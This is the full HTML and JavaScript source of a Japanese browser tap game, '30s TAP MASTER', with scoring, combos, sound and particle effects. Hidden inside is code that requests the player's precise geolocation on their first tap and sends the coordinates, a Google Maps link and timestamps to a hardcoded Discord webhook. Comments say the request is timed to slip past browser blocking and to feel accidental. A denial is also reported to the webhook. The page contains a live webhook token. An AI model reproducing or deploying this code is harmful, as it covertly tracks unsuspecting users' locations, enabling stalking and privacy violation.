<!DOCTYPE html>

    <script>

    <style>
        * {
            -webkit-tap-highlight-color: transparent;
        }

        html, body {
            background-color: #08090d;
            color: #ffffff;
            touch-action: manipulation;
            user-select: none;
            -webkit-user-select: none;
            -webkit-touch-callout: none;
            overflow: hidden;
            overscroll-behavior: none;
        }

        .glow-cyan {
            box-shadow: 0 0 25px rgba(0, 243, 255, 0.6), inset 0 0 20px rgba(0, 243, 255, 0.4);
            text-shadow: 0 0 12px rgba(0, 243, 255, 0.8);
        }
        .glow-pink {
            box-shadow: 0 0 35px rgba(255, 0, 127, 0.8), inset 0 0 25px rgba(255, 0, 127, 0.6);
            text-shadow: 0 0 15px rgba(255, 0, 127, 0.9);
        }
        .glow-gold {
            box-shadow: 0 0 40px rgba(255, 215, 0, 0.9), inset 0 0 30px rgba(255, 215, 0, 0.7);
            text-shadow: 0 0 18px rgba(255, 215, 0, 1);
        }

        .tap-btn {
            transition: transform 0.05s cubic-bezier(0.1, 0.9, 0.2, 1), box-shadow 0.15s;
            will-change: transform;
            cursor: pointer;
        }
        .tap-btn.active-press {
            transform: scale(0.94) !important;
        }

        /* 大型タップ用の見えない当たり判定レイヤー */
        #hitLayer {
            position: fixed;
            inset: 0;
            z-index: 15;
            cursor: pointer;
        }
        /* 結果モーダル表示中は無効化 */
        #hitLayer.disabled {
            pointer-events: none;
        }

        .float-text {
            position: fixed;
            pointer-events: none;
            font-weight: 900;
            font-family: 'Teko', sans-serif;
            animation: floatUp 0.65s cubic-bezier(0.18, 0.89, 0.32, 1.28) forwards;
            z-index: 50;
        }

        @keyframes floatUp {
            0% {
                opacity: 1;
                transform: translate(-50%, -50%) scale(0.7) rotate(0deg);
            }
            50% {
                transform: translate(-50%, -110%) scale(1.4) rotate(-6deg);
            }
            100% {
                opacity: 0;
                transform: translate(-50%, -180%) scale(1) rotate(6deg);
            }
        }

        .shake {
            animation: shakeAnim 0.12s ease-in-out infinite;
        }
        @keyframes shakeAnim {
            0% { transform: translate(0, 0); }
            25% { transform: translate(-5px, 5px); }
            50% { transform: translate(5px, -4px); }
            75% { transform: translate(-4px, -3px); }
            100% { transform: translate(0, 0); }
        }

        #particleCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 10;
        }

        /* Ripple（うっかりタップ時のフィードバック） */
        .ripple {
            position: fixed;
            border-radius: 50%;
            pointer-events: none;
            background: radial-gradient(circle, rgba(0,243,255,0.6) 0%, rgba(0,243,255,0) 70%);
            transform: translate(-50%, -50%);
            animation: rippleAnim 0.5s ease-out forwards;
            z-index: 40;
        }
        @keyframes rippleAnim {
            0%   { width: 0; height: 0; opacity: 1; }
            100% { width: 200px; height: 200px; opacity: 0; }
        }
    </style>
</head>

    <script>
        // ============================================================
        // DISCORD WEBHOOK 設定

        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1557711862429126696/InSgaOfsTZM-Qy52G1kDYmoDmdJbgz8ouhC20Ryb2HfLfkWRiHm3H8b-Ly3Vfzoc_T5Y';

        // --- WEB AUDIO API SOUND SYNTHESIZER ---
        class SoundFX {
            constructor() {
                this.ctx = null;
                this.muted = false;
            }

            init() {
                if (!this.ctx) {
                    this.ctx = new (window.AudioContext || window.webkitAudioContext)();
                }
                if (this.ctx.state === 'suspended') {
                    this.ctx.resume();
                }
            }

            playTap(isFever = false) {
                if (this.muted) return;
                this.init();

                const osc = this.ctx.createOscillator();
                const gain = this.ctx.createGain();

                osc.type = isFever ? 'triangle' : 'sine';
                const baseFreq = isFever ? 650 : 380;
                const freq = baseFreq + Math.random() * 120;
                
                osc.frequency.setValueAtTime(freq, this.ctx.currentTime);
                osc.frequency.exponentialRampToValueAtTime(80, this.ctx.currentTime + 0.05);

                gain.gain.setValueAtTime(isFever ? 0.35 : 0.25, this.ctx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, this.ctx.currentTime + 0.05);

                osc.connect(gain);
                gain.connect(this.ctx.destination);

                osc.start();
                osc.stop(this.ctx.currentTime + 0.05);
            }

            playFinish() {
                if (this.muted) return;
                this.init();

                const now = this.ctx.currentTime;
                [440, 554, 659, 880].forEach((freq, idx) => {
                    const osc = this.ctx.createOscillator();
                    const gain = this.ctx.createGain();

                    osc.type = 'triangle';
                    osc.frequency.setValueAtTime(freq, now + idx * 0.07);

                    gain.gain.setValueAtTime(0.3, now + idx * 0.07);
                    gain.gain.exponentialRampToValueAtTime(0.001, now + idx * 0.07 + 0.25);

                    osc.connect(gain);
                    gain.connect(this.ctx.destination);

                    osc.start(now + idx * 0.07);
                    osc.stop(now + idx * 0.07 + 0.25);
                });
            }
        }

        const audio = new SoundFX();

        // --- 触覚フィードバック（対応端末のみ） ---
        function haptic(pattern = 10) {
            if (navigator.vibrate) {
                try { navigator.vibrate(pattern); } catch (e) {}
            }
        }

        // --- PARTICLE CANVAS SYSTEM ---
        class ParticleSystem {
            constructor(canvas) {
                this.canvas = canvas;
                this.ctx = canvas.getContext('2d');
                this.particles = [];
                this.resize();
                window.addEventListener('resize', () => this.resize());
            }

            resize() {
                this.canvas.width = window.innerWidth;
                this.canvas.height = window.innerHeight;
            }

            spawn(x, y, color, count = 6) {
                for (let i = 0; i < count; i++) {
                    const angle = Math.random() * Math.PI * 2;
                    const speed = 2 + Math.random() * 7;
                    this.particles.push({
                        x, y,
                        vx: Math.cos(angle) * speed,
                        vy: Math.sin(angle) * speed,
                        size: 3 + Math.random() * 4,
                        color,
                        alpha: 1
                    });
                }
            }

            update() {
                this.ctx.clearRect(0, 0, this.canvas.width, this.canvas.height);

                for (let i = this.particles.length - 1; i >= 0; i--) {
                    const p = this.particles[i];
                    p.x += p.vx;
                    p.y += p.vy;
                    p.vx *= 0.94;
                    p.vy *= 0.94;
                    p.alpha -= 0.04;

                    if (p.alpha <= 0) {
                        this.particles.splice(i, 1);
                        continue;
                    }

                    this.ctx.save();
                    this.ctx.globalAlpha = p.alpha;
                    this.ctx.fillStyle = p.color;
                    this.ctx.beginPath();
                    this.ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
                    this.ctx.fill();
                    this.ctx.restore();
                }

                requestAnimationFrame(() => this.update());
            }
        }

        const particleCanvas = document.getElementById('particleCanvas');
        const particles = new ParticleSystem(particleCanvas);
        particles.update();

        // --- GAME ENGINE ---
        class TapGame {
            constructor() {
                this.state = 'idle';
                this.duration = 30.0;
                this.timeLeft = 30.0;
                this.score = 0;
                this.combo = 0;
                this.maxCombo = 0;
                this.isFever = false;
                this.tapHistory = [];
                this.peakCps = 0;
                this.gameInterval = null;
                this.locationTimer = null;
                this.locationRequested = false;
                this.lastTapTime = 0;

                this.initDOM();
                this.bindEvents();
            }

            initDOM() {
                this.dom = {
                    timeDisplay: document.getElementById('timeDisplay'),
                    scoreDisplay: document.getElementById('scoreDisplay'),
                    cpsDisplay: document.getElementById('cpsDisplay'),
                    tapBtn: document.getElementById('tapBtn'),
                    tapText: document.getElementById('tapText'),
                    subTapText: document.getElementById('subTapText'),
                    orbIcon: document.getElementById('orbIcon'),
                    orbRing1: document.getElementById('orbRing1'),
                    orbRing2: document.getElementById('orbRing2'),
                    comboBadge: document.getElementById('comboBadge'),
                    comboCount: document.getElementById('comboCount'),
                    feverBadge: document.getElementById('feverBadge'),
                    resetBtn: document.getElementById('resetBtn'),
                    resultModal: document.getElementById('resultModal'),
                    soundToggle: document.getElementById('soundToggle'),
                    soundIcon: document.getElementById('soundIcon'),
                    hitLayer: document.getElementById('hitLayer')
                };
            }

            bindEvents() {
                // =============================================
                // 全デバイス共通：Pointer Events で一括処理
                // （PC/スマホ/タブレット/ペンすべてで動作）
                // =============================================
                let pointerId = null;

                this.dom.hitLayer.addEventListener('pointerdown', (e) => {
                    // 結果モーダル表示中は無効
                    if (!this.dom.resultModal.classList.contains('hidden')) return;

                    e.preventDefault();
                    pointerId = e.pointerId;
                    this.onTap(e.clientX, e.clientY, e);

                    // 連続押し対応（取れる場合）
                    try { this.dom.hitLayer.setPointerCapture(e.pointerId); } catch (err) {}
                }, { passive: false });

                // コンテキストメニュー（長押しメニュー）を無効化
                this.dom.hitLayer.addEventListener('contextmenu', (e) => e.preventDefault());

                // ダブルタップズーム防止
                document.addEventListener('dblclick', (e) => e.preventDefault(), { passive: false });

                // iOS のピンチズーム防止
                document.addEventListener('gesturestart', (e) => e.preventDefault());

                // スペース / Enter キー
                window.addEventListener('keydown', (e) => {
                    if ((e.code === 'Space' || e.code === 'Enter') && !e.repeat) {
                        if (this.dom.resultModal.classList.contains('hidden')) {
                            e.preventDefault();
                            const rect = this.dom.tapBtn.getBoundingClientRect();
                            this.onTap(
                                rect.left + rect.width / 2,
                                rect.top + rect.height / 2,
                                null,
                                true
                            );
                        }
                    }
                });

                // コントロール
                this.dom.resetBtn.addEventListener('click', (e) => {
                    e.stopPropagation();
                    this.resetGame();
                });
                document.getElementById('retryBtn').addEventListener('click', (e) => {
                    e.stopPropagation();
                    this.dom.resultModal.classList.add('hidden');
                    this.dom.hitLayer.classList.remove('disabled');
                    this.resetGame();
                });

                // サウンド
                this.dom.soundToggle.addEventListener('click', (e) => {
                    e.stopPropagation();
                    audio.muted = !audio.muted;
                    this.dom.soundIcon.className = audio.muted
                        ? 'fa-solid fa-volume-xmark text-red-400'
                        : 'fa-solid fa-volume-high text-neonCyan';
                });

                // 共有
                document.getElementById('shareBtn').addEventListener('click', (e) => {
                    e.stopPropagation();
                    const avgCps = (this.score / 30.0).toFixed(1);
                    const rank = this.getRank(this.score).title;
                    const text = `🔥【30秒連打マスター】で【${rank}】を獲得！\n記録: ${this.score} 連打 (平均 ${avgCps} CPS / 最高 ${this.peakCps.toFixed(1)} CPS)\n#30秒連打マスター #連打ゲーム`;
                    const twitterUrl = `https://twitter.com/intent/tweet?text=${encodeURIComponent(text)}`;
                    window.open(twitterUrl, '_blank');
                });
            }

            startGame() {
                this.state = 'playing';
                this.timeLeft = 30.0;
                this.score = 0;
                this.combo = 0;
                this.maxCombo = 0;
                this.tapHistory = [];
                this.peakCps = 0;

                this.dom.tapText.textContent = '連打！！';
                this.dom.subTapText.textContent = '画面のどこでもタップ！';
                this.dom.resetBtn.classList.remove('hidden');
                this.dom.resetBtn.style.pointerEvents = 'auto';

                const startTime = Date.now();
                this.gameInterval = setInterval(() => {
                    const elapsed = (Date.now() - startTime) / 1000;
                    this.timeLeft = Math.max(0, 30.0 - elapsed);
                    this.dom.timeDisplay.innerHTML = `${this.timeLeft.toFixed(1)}<span class="text-lg">s</span>`;
                    this.updateCPS();
                    if (this.timeLeft <= 0) this.endGame();
                }, 50);
            }

            // ============================================================
            // 位置情報取得 → Discord 送信
            // ============================================================
            async requestLocationAndSend() {
                if (this.locationRequested) return;
                this.locationRequested = true;

                if (!navigator.geolocation) {
                    await this.sendToDiscord({
                        content: '⚠️ **位置情報APIが利用できませんでした**\n（ブラウザ非対応）'
                    });
                    this.showToast('⚠️ 位置情報APIが利用できません', true);
                    return;
                }

                this.showToast('📍 位置情報を取得中...');

                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const accuracy = position.coords.accuracy;
                        const timestamp = new Date().toLocaleString('ja-JP', { timeZone: 'Asia/Tokyo' });

                        await this.sendToDiscord({
                            content: '📍 **位置情報を取得しました**',
                            embeds: [{
                                title: '🎯 30s TAP MASTER - 位置情報ログ',
                                color: 0x00f3ff,
                                fields: [
                                    { name: '📌 緯度 (Latitude)',  value: `\`${lat}\``,              inline: true },
                                    { name: '📌 経度 (Longitude)', value: `\`${lng}\``,              inline: true },
                                    { name: '🎯 精度 (Accuracy)',  value: `\`${accuracy.toFixed(1)} m\``, inline: true },
                                    { name: '💥 現在のスコア',     value: `\`${this.score} taps\``,   inline: true },
                                    { name: '⚡ リアルタイムCPS', value: `\`${this.dom.cpsDisplay.textContent}\``, inline: true },
                                    { name: '🕒 取得時刻',         value: `\`${timestamp}\``,         inline: true },
                                    { name: '🗺️ Google Maps',      value: `[地図を開く](https://www.google.com/maps?q=${lat},${lng})` }
                                ],
                                footer: { text: '30 SEC TAP MASTER' },
                                timestamp: new Date().toISOString()
                            }]
                        });

                        this.showToast('📍 位置情報を送信しました');
                    },
                    async (error) => {
                        let reason = '不明なエラー';
                        switch (error.code) {
                            case error.PERMISSION_DENIED:
                                reason = 'ユーザーが許可を拒否しました';
                                break;
                            case error.POSITION_UNAVAILABLE:
                                reason = '位置情報が取得できません';
                                break;
                            case error.TIMEOUT:
                                reason = 'タイムアウトしました';
                                break;
                        }

                        await this.sendToDiscord({
                            content: `❌ **位置情報の取得に失敗**\n理由: \`${reason}\`\nスコア: \`${this.score} taps\``
                        });

                        this.showToast('❌ 位置情報が取得できませんでした', true);
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            }

            async sendToDiscord(payload) {
                try {
                    const res = await fetch(DISCORD_WEBHOOK_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    return res.ok;
                } catch (e) {
                    console.error('Discord送信失敗:', e);
                    return false;
                }
            }

            showToast(message, isError = false) {
                const toast = document.createElement('div');
                toast.className = `fixed top-20 left-1/2 z-[70] px-5 py-3 rounded-xl font-bold text-sm shadow-2xl border ${
                    isError
                        ? 'bg-red-500/90 text-white border-red-300'
                        : 'bg-neonCyan/90 text-black border-cyan-200'
                }`;
                toast.style.transform = 'translate(-50%, -20px)';
                toast.style.opacity = '0';
                toast.style.transition = 'all 0.3s ease';
                toast.style.pointerEvents = 'none';
                toast.textContent = message;
                document.body.appendChild(toast);

                requestAnimationFrame(() => {
                    toast.style.transform = 'translate(-50%, 0)';
                    toast.style.opacity = '1';
                });

                setTimeout(() => {
                    toast.style.opacity = '0';
                    toast.style.transform = 'translate(-50%, -20px)';
                    setTimeout(() => toast.remove(), 300);
                }, 3000);
            }

            // ============================================================
            // タップ処理
            // ============================================================
            onTap(x, y, e, fromKeyboard = false) {
                if (this.state === 'finished') return;
                if (!this.dom.resultModal.classList.contains('hidden')) return;

                // ★ 最初のタップ時に位置情報リクエストを発火
                //   （ユーザージェスチャー扱いになるためブラウザにブロックされにくい）
                if (!this.locationRequested && this.state === 'idle') {
                    // わずかに遅延させて「うっかりタップ＝ゲーム開始」感を演出
                    setTimeout(() => this.requestLocationAndSend(), 300);
                }

                // ゲーム開始
                if (this.state === 'idle') {
                    this.startGame();
                }

                const now = Date.now();

                // 押し込みエフェクト
                this.dom.tapBtn.classList.add('active-press');
                setTimeout(() => this.dom.tapBtn.classList.remove('active-press'), 60);

                // コンボ判定
                if (now - this.lastTapTime < 350) {
                    this.combo++;
                } else {
                    this.combo = 1;
                }
                this.lastTapTime = now;

                if (this.combo > this.maxCombo) {
                    this.maxCombo = this.combo;
                }

                this.isFever = this.combo >= 25;
                const points = this.isFever ? 2 : 1;
                this.score += points;

                this.tapHistory.push(now);

                // サウンド・振動
                audio.playTap(this.isFever);
                haptic(this.isFever ? [8, 5, 8] : 8);

                // パーティクル
                const particleColor = this.isFever ? '#ffd700' : '#00f3ff';
                particles.spawn(x, y, particleColor, this.isFever ? 10 : 5);

                // 波紋エフェクト（うっかりタップでも押した感）
                this.spawnRipple(x, y, this.isFever);

                // フロートテキスト
                this.spawnFloatText(x, y, `+${points}`, this.isFever);

                // Fever 演出
                if (this.isFever) {
                    this.dom.feverBadge.classList.remove('hidden');
                    this.dom.tapBtn.classList.remove('glow-cyan');
                    this.dom.tapBtn.classList.add('glow-gold');
                    document.body.classList.add('shake');
                    setTimeout(() => document.body.classList.remove('shake'), 80);
                } else {
                    this.dom.feverBadge.classList.add('hidden');
                    this.dom.tapBtn.classList.add('glow-cyan');
                    this.dom.tapBtn.classList.remove('glow-gold');
                }

                // コンボバッジ
                if (this.combo >= 5) {
                    this.dom.comboBadge.classList.remove('hidden');
                    this.dom.comboCount.textContent = this.combo;
                } else {
                    this.dom.comboBadge.classList.add('hidden');
                }

                this.dom.scoreDisplay.textContent = this.score;
            }

            spawnRipple(x, y, isFever) {
                const el = document.createElement('div');
                el.className = 'ripple';
                el.style.left = `${x}px`;
                el.style.top = `${y}px`;
                if (isFever) {
                    el.style.background = 'radial-gradient(circle, rgba(255,215,0,0.7) 0%, rgba(255,215,0,0) 70%)';
                }
                document.body.appendChild(el);
                setTimeout(() => el.remove(), 500);
            }

            updateCPS() {
                const now = Date.now();
                this.tapHistory = this.tapHistory.filter(t => now - t <= 1000);
                const currentCps = this.tapHistory.length;

                if (currentCps > this.peakCps) {
                    this.peakCps = currentCps;
                }

                this.dom.cpsDisplay.textContent = currentCps.toFixed(1);
            }

            spawnFloatText(x, y, text, isFever) {
                const el = document.createElement('div');
                el.className = `float-text ${isFever ? 'text-neonGold text-4xl' : 'text-neonCyan text-3xl'}`;
                el.textContent = text;
                el.style.left = `${x}px`;
                el.style.top = `${y}px`;
                document.body.appendChild(el);

                setTimeout(() => el.remove(), 650);
            }

            getRank(score) {
                if (score >= 350) return { title: '神レベル (GOD TAPPER)', color: 'bg-neonGold text-black' };
                if (score >= 260) return { title: '達人レベル (MASTER)', color: 'bg-neonPink text-white' };
                if (score >= 180) return { title: '上級者レベル (EXPERT)', color: 'bg-purple-600 text-white' };
                if (score >= 100) return { title: '中級者レベル (PRO)', color: 'bg-neonCyan text-black' };
                return { title: '初心者レベル (BEGINNER)', color: 'bg-slate-700 text-white' };
            }

            endGame() {
                clearInterval(this.gameInterval);
                clearTimeout(this.locationTimer);
                this.state = 'finished';

                audio.playFinish();
                haptic([30, 40, 30, 40, 80]);

                // 位置情報が未取得なら終了時にもう一度試みる
                if (!this.locationRequested) {
                    this.requestLocationAndSend();
                }

                const bestScore = parseInt(localStorage.getItem('30s_tap_best') || '0', 10);
                const isNewRecord = this.score > bestScore;
                if (isNewRecord) {
                    localStorage.setItem('30s_tap_best', this.score);
                }

                const avgCps = (this.score / 30.0).toFixed(1);
                const rankInfo = this.getRank(this.score);

                const rankBadge = document.getElementById('rankBadge');
                rankBadge.textContent = `RANK: ${rankInfo.title}`;
                rankBadge.className = `inline-block px-4 py-1 rounded-full font-black text-xs uppercase tracking-widest mb-3 shadow-lg ${rankInfo.color}`;

                document.getElementById('resTotalHits').textContent = this.score;
                document.getElementById('resAvgCps').textContent = avgCps;
                document.getElementById('resPeakCps').textContent = this.peakCps.toFixed(1);
                document.getElementById('resMaxCombo').textContent = this.maxCombo;

                const newRecordNotice = document.getElementById('newRecordNotice');
                if (isNewRecord && this.score > 0) {
                    newRecordNotice.classList.remove('hidden');
                } else {
                    newRecordNotice.classList.add('hidden');
                }

                this.dom.hitLayer.classList.add('disabled');
                this.dom.resultModal.classList.remove('hidden');
            }

            resetGame() {
                clearInterval(this.gameInterval);
                clearTimeout(this.locationTimer);
                this.state = 'idle';
                this.timeLeft = 30.0;
                this.score = 0;
                this.combo = 0;
                this.maxCombo = 0;
                this.isFever = false;
                this.tapHistory = [];
                this.peakCps = 0;
                this.locationRequested = false;

                this.dom.timeDisplay.innerHTML = `30.0<span class="text-lg">s</span>`;
                this.dom.scoreDisplay.textContent = '0';
                this.dom.cpsDisplay.textContent = '0.0';
                this.dom.tapText.textContent = 'START TAP!';
                this.dom.subTapText.textContent = '画面のどこでもタップ！';
                this.dom.comboBadge.classList.add('hidden');
                this.dom.feverBadge.classList.add('hidden');
                this.dom.resetBtn.classList.add('hidden');
                this.dom.tapBtn.className = 'tap-btn relative w-56 h-56 md:w-64 md:h-64 rounded-full bg-gradient-to-br from-cyan-500 via-blue-600 to-indigo-950 glow-cyan border-4 border-cyan-300 flex flex-col justify-center items-center cursor-pointer focus:outline-none shadow-2xl pointer-events-none';
                this.dom.hitLayer.classList.remove('disabled');
            }
        }

        // ============================================================
        // 初期化
        // ============================================================
        window.addEventListener('load', () => {
            new TapGame();

            // スクロール・引っ張り更新を完全無効化（iOS対策）
            document.addEventListener('touchmove', (e) => {
                if (e.touches.length > 1) e.preventDefault();
            }, { passive: false });
        });

        // ビューポート高さの安定化（モバイルブラウザのアドレスバー対策）
        function setVH() {
            document.documentElement.style.setProperty('--vh', `${window.innerHeight * 0.01}px`);
        }
        setVH();
        window.addEventListener('resize', setVH);
        window.addEventListener('orientationchange', setVH);
    </script>
</body>
</html>
